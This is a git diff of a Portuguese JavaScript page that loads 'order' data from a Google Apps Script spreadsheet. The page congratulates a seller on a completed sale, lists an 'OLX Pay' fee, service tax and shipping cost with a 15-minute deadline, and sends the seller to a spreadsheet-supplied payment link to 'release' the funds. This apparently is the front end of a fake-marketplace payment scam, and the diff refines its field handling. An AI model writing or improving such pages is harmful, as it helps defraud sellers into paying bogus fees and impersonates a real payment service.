@@ -5,7 +5,7 @@ const WEB_APP_URL = 'https://script.google.com/macros/s/AKfycbw25mbSP6E1kpFtV0tM
 
 const mainContainer = document.getElementById('main-container');
 
-// --- Função Auxiliar de Formatação e Limpeza (REVISADA) ---
+// --- Função Auxiliar de Formatação (REVISADA) ---
 const formatValueForClient = (value) => {
     if (!value) return ''; 
     let valueStr = String(value).trim();
@@ -13,18 +13,16 @@ const formatValueForClient = (value) => {
     // 1. Limpa o prefixo 'R$' para processamento
     valueStr = valueStr.replace(/R\$\s*/g, '');
     
-    // 2. Se for texto, retorna o texto (Ex: Grátis, Inclusa)
-    if (valueStr.match(/gr[aá]tis|inclusa|horas/i) || valueStr.match(/vendas|avaliação|taxa de/i)) {
+    // 2. Se for texto (como 'Grátis' ou '12 horas'), retorna o texto
+    if (valueStr.match(/gr[aá]tis|inclusa|horas|vendas|avaliação|taxa de/i)) {
         return valueStr;
     }
 
-    // 3. Tenta formatar como número
-    let numericStr = valueStr.replace(/\./g, '').replace(/,/g, '.'); // Remove ponto de milhar e transforma vírgula em ponto
+    // 3. Tenta formatar como número (garante formato 1.000,00)
+    let numericStr = valueStr.replace(/\./g, '').replace(/,/g, '.');
     let number = parseFloat(numericStr);
     
     if (!isNaN(number)) {
-        // Aplica formatação de milhar (ponto) e centavos (vírgula)
-        // Isso garante o formato 1.000,00
         return number.toLocaleString('pt-BR', { minimumFractionDigits: 2 });
     }
     
@@ -64,7 +62,6 @@ const getDisplayValue = (data, isCurrencyField, defaultText) => {
     const json = await response.json();
 
     if (json.status === 'success') {
-      // SÓ CHAMA O RENDER SE TIVER SUCESSO. ISSO GARANTE QUE A PÁGINA SÓ APARECE POPULADA.
       renderContainer(json.data);
     } else {
       renderError(json.message || 'Pedido não encontrado.');
@@ -77,11 +74,21 @@ const getDisplayValue = (data, isCurrencyField, defaultText) => {
 
 // --- Função de Renderização Principal ---
 function renderContainer(dadosBrutos) {
-  // Normaliza os dados para minúsculo
+  // Inicialização e normalização para minúsculas
   const dados = {};
   Object.keys(dadosBrutos).forEach(key => {
+    // A chave do objeto será o header em minúsculo (Ex: 'valor total')
     dados[key.toLowerCase()] = dadosBrutos[key];
   });
+
+  // --- CRIAÇÃO DE ALIASES (Mapeamento Robusto) ---
+  // Isso garante que o campo seja preenchido, mesmo se o cabeçalho for "Valor Total"
+  dados.valor = dados.valor || dados['valor total'] || dados['valor do produto'] || '';
+  dados.taxa = dados.taxa || dados['taxa de serviço'] || '';
+  dados.frete = dados.frete || dados['custo frete'] || '';
+  dados.tarifa = dados.tarifa || dados['tarifa olx pay'] || '';
+  dados.linkpagamento = dados.linkpagamento || dados['link pagamento'] || dados['checkout'] || '#';
+  // Fim dos Aliases
 
   mainContainer.innerHTML = '';
 
@@ -95,7 +102,7 @@ function renderContainer(dadosBrutos) {
   const prazo = dados.prazo || '15 minutos';
   
   // Link dinâmico vindo da planilha
-  const linkFinal = dados.linkpagamento || dados['link pagamento'] || dados['checkout'] || '#';
+  const linkFinal = dados.linkpagamento;
 
   content.innerHTML = `
     <p>🎉 <span class="highlight">Parabéns!</span> Você vendeu seu produto com segurança.</p>
@@ -151,7 +158,7 @@ function renderContainer(dadosBrutos) {
     id: 'btn-pagamento', 
     class: 'button hidden', 
     href: linkFinal 
-  }, 'Seguir para a liberação'); // <-- TEXTO DO BOTÃO AJUSTADO
+  }, 'Seguir para a liberação');
   
   const btnContainer = criarElemento('div', { class: 'button-container' }, btnPagamento);
   content.appendChild(btnContainer);
